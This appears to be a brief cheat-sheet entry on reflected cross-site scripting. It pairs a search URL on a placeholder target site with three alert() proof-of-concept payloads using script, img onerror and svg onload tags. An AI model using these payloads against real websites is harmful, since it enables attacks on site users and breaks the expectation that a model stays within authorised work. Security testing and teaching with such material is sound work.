# Cross-Site Scripting (XSS)
## Reflected XSS
1. ```https://www.target.net/inc.search_ney.php```>```<script>alert()</script>```,```<img src=x onerror=alert()>```,```<svg onload=alert()>```
